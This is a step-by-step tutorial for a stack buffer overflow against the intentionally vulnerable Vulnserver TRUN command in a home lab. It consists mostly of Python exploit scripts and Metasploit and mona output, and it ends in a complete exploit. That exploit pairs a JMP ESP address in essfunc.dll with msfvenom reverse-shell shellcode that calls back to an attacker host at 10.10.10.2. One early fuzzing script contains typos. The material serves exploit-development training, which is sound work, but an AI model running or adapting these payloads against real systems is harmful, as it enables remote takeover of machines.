# Buffer Overflows Made Easy

## SETUP

Two machines:
* Windows 10: Running target binary and Used for debugging
* Kali Linux: Used for exploit writting

### Windows 10 Victim and Debugger

* Vulnserver
* Immunity Debugger

## Spiking

Verify if target is vulnerable and what parts of it are

* generic_send_tcp 10.10.10.3 9999 stats.spk 0 0

```
s_readline();
s_string("STATS ");
s_string_variable("0");
```

* generic_send_tcp 10.10.10.3 9999 trun.spk 0 0

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

> After running the previous command we can see in our debugger that the code has crashed and we have overwritten EAX,ESP,EBP, and **most importantly EIP**.

## Fuzzing

Now that we know the TRUN command is vulnerable, we will focus on creating a payload to exploit it

```PYTHON
#!/usr/bin/python
import sys
import socket
from time import sleep

buffer = 'A' * 100

while True:
    try:
        s=socket.scoket(socket.AF_INET,socket.SOCK_STREAM)
        s.connecT(('10.10.10.3', 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + 'A'*100
    except:
        print('Fuzzing crashed at %i bytes' % len(buffer))
        sys.exit()
```

* chmod +x fuzz.py
* ./fuzz.py
* Wait for crash on immunity debugger
> Vulnserver seems to have crashed at 2000 characters

## Finding the Offset

We want to find the offset at which we will be overwritting the EIP register, to control the function instruction execution.

* /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D

* Modify our fuzzing script:

```PYTHON
#!/usr/bin/python
import sys
import socket

buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D'


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.3', 9999))
    s.send(('TRUN /.:/' + buffer))
    s.close()
except Exception, e:
    print('Exception: %s' % e)
    sys.exit()
```

* chmod +x fuzz_2.py
* ./fuzz_2.py

* Immunnity debugger shows us that the EIP address has set a value of: 386f4337
* /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386f4337
> This will return an offset value of **2003**

## Overwritting the EIP

* Modify our script to overwrite the EIP with a specified value

```PYTHON
#!/usr/bin/python
import sys
import socket

shellcode = 'A' * 2003
shellcode += 'B' * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.3', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except Exception, e:
    print('Exception: %s' % e)
    sys.exit()
```

* We run and verify that the EIP is being overwritten by exactly our 4 **B**

## Fixing Bad Characters

* we get a list of possible bad characters from the Internetz
* We send the payload and verify that x00 is giving us trouble, we remove it and all other characters look good when we look at the dump

```python
#!/usr/bin/python
import sys
import socket


badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = 'A' * 2003
shellcode += 'B' * 4 + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.3', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except Exception, e:
    print('Exception: %s' % e)
    sys.exit()
```

## Finding the Right Module

* Get mona.py from mona modules
* Save it to "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\Py Commands"
* From the commnad bar in the bottom of the debugger run `mona modules` and it will show us a list of modules with their permission
* Look for modules with all settings set to False and select on that is related to the vulnserver


> -----------------------------------------------------------------------------------------------------------------------------------------
>  Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
> -----------------------------------------------------------------------------------------------------------------------------------------
>  0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
>  0x77290000 | 0x77489000 | 0x001f9000 | True   | True    | True  |  False   | True   | 10.0.17763.771 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
>  0x750b0000 | 0x75129000 | 0x00079000 | True   | True    | True  |  False   | True   | 10.0.17763.701 [sechost.dll] (C:\Windows\System32\sechost.dll)
>  0x708b0000 | 0x70902000 | 0x00052000 | True   | True    | True  |  False   | True   | 10.0.17763.701 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
>  0x6e5a0000 | 0x6e63c000 | 0x0009c000 | True   | True    | True  |  False   | True   | 10.0.17763.701 [apphelp.dll] (C:\Windows\SYSTEM32\apphelp.dll)
>  0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\ouroboros\Desktop\vulnserver\vulnserver.exe)
>  0x76960000 | 0x76a40000 | 0x000e0000 | True   | True    | True  |  False   | True   | 10.0.17763.771 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
>  0x75670000 | 0x75730000 | 0x000c0000 | True   | True    | True  |  False   | True   | 7.0.17763.475 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll)
>  0x74af0000 | 0x74afa000 | 0x0000a000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [CRYPTBASE.dll] (C:\Windows\System32\CRYPTBASE.dll)
>  0x74b00000 | 0x74b20000 | 0x00020000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [SspiCli.dll] (C:\Windows\System32\SspiCli.dll)
>  0x774a0000 | 0x7763c000 | 0x0019c000 | True   | True    | True  |  False   | True   | 10.0.17763.771 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
>  0x762f0000 | 0x763af000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.17763.701 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
>  0x74e90000 | 0x74eef000 | 0x0005f000 | True   | True    | True  |  False   | True   | 10.0.17763.701 [WS2_32.DLL] (C:\Windows\System32\WS2_32.DLL)
>  0x74e20000 | 0x74e82000 | 0x00062000 | True   | True    | True  |  False   | True   | 10.0.17763.678 [bcryptPrimitives.dll] (C:\Windows\System32\bcryptPrimitives.dll)



> We will be using the following dll: essfunc.dll

* Get the HEXCODE of JMP ESP
    * locate nasm_shell
    * usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
        * JMP ESP
> The HEXCODE is FFE4

> 0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x625011c7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x625011d3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x625011df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x625011eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x625011f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)
> 0x62501205 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ouroboros\Desktop\vulnserver\essfunc.dll)

* !mona find -s "\xff\xe4" -m essfunc.dll

* Set a breakpoint at the address of 625011af by following it, clickin it and pressing F2
* Run our script and we will hit the breakpoint

```PYTHON
#!/usr/bin/python
import sys
import socket

shellcode = 'A' * 2003
shellcode += '\xaf\x11\x50\x62'

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.3', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except Exception, e:
    print('Exception: %s' % e)
    sys.exit()
```

## Generating Shellcode and Gaining Shells

* msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.2 LPORT=6464 EXITFUNC=thread -f c -a x86 -b "\x00"

```python
#!/usr/bin/python
import sys
import socket

overflow = ("\xda\xd4\xba\x1f\xb3\x7f\x4a\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x17\x83\xc6\x04\x03\x49\xa0\x9d\xbf\x89\x2e\xe3"
"\x40\x71\xaf\x84\xc9\x94\x9e\x84\xae\xdd\xb1\x34\xa4\xb3\x3d"
"\xbe\xe8\x27\xb5\xb2\x24\x48\x7e\x78\x13\x67\x7f\xd1\x67\xe6"
"\x03\x28\xb4\xc8\x3a\xe3\xc9\x09\x7a\x1e\x23\x5b\xd3\x54\x96"
"\x4b\x50\x20\x2b\xe0\x2a\xa4\x2b\x15\xfa\xc7\x1a\x88\x70\x9e"
"\xbc\x2b\x54\xaa\xf4\x33\xb9\x97\x4f\xc8\x09\x63\x4e\x18\x40"
"\x8c\xfd\x65\x6c\x7f\xff\xa2\x4b\x60\x8a\xda\xaf\x1d\x8d\x19"
"\xcd\xf9\x18\xb9\x75\x89\xbb\x65\x87\x5e\x5d\xee\x8b\x2b\x29"
"\xa8\x8f\xaa\xfe\xc3\xb4\x27\x01\x03\x3d\x73\x26\x87\x65\x27"
"\x47\x9e\xc3\x86\x78\xc0\xab\x77\xdd\x8b\x46\x63\x6c\xd6\x0e"
"\x40\x5d\xe8\xce\xce\xd6\x9b\xfc\x51\x4d\x33\x4d\x19\x4b\xc4"
"\xb2\x30\x2b\x5a\x4d\xbb\x4c\x73\x8a\xef\x1c\xeb\x3b\x90\xf6"
"\xeb\xc4\x45\x58\xbb\x6a\x36\x19\x6b\xcb\xe6\xf1\x61\xc4\xd9"
"\xe2\x8a\x0e\x72\x88\x71\xd9\x77\x47\x73\x1b\xe0\x55\x83\x02"
"\xb0\xd0\x65\x5e\x20\xb5\x3e\xf7\xd9\x9c\xb4\x66\x25\x0b\xb1"
"\xa9\xad\xb8\x46\x67\x46\xb4\x54\x10\xa6\x83\x06\xb7\xb9\x39"
"\x2e\x5b\x2b\xa6\xae\x12\x50\x71\xf9\x73\xa6\x88\x6f\x6e\x91"
"\x22\x8d\x73\x47\x0c\x15\xa8\xb4\x93\x94\x3d\x80\xb7\x86\xfb"
"\x09\xfc\xf2\x53\x5c\xaa\xac\x15\x36\x1c\x06\xcc\xe5\xf6\xce"
"\x89\xc5\xc8\x88\x95\x03\xbf\x74\x27\xfa\x86\x8b\x88\x6a\x0f"
"\xf4\xf4\x0a\xf0\x2f\xbd\x2b\x13\xe5\xc8\xc3\x8a\x6c\x71\x8e"
"\x2c\x5b\xb6\xb7\xae\x69\x47\x4c\xae\x18\x42\x08\x68\xf1\x3e"
"\x01\x1d\xf5\xed\x22\x34")

nops = '\x90' * 32

shellcode = 'A' * 2003
shellcode += '\xaf\x11\x50\x62' + nops + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.3', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except Exception, e:
    print('Exception: %s' % e)
    sys.exit()
```

* python fuzzer.py